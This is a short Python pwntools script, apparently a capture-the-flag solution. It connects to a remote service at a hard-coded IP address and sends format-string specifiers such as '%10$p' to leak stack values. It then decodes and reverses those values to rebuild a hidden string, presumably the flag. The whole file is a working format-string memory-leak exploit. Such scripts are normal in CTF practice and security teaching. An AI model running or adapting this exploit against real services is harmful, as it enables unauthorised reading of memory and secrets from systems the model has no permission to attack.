from pwn import *


elf =context.binary = ELF('./main')


context.log_level ='error'

adr =0x7fffffffdd28

offset =12 
a =[]
win =''
for i in range(10,13):
	p=remote('20.199.80.91' ,7400)
	x='%{}$p'.format(i)
	try:
		print(i)
		p.sendlineafter(b'think ? > ',str(x).encode())
		string =str(p.recv())[2:-3]
		print(bytes.fromhex(string[2:]).decode('utf-8')[::-1])
		win = win +bytes.fromhex(string[2:]).decode('utf-8')[::-1]
	except:
		a.append(i)
		print('not a valid adress')
	p.close()



print(win)
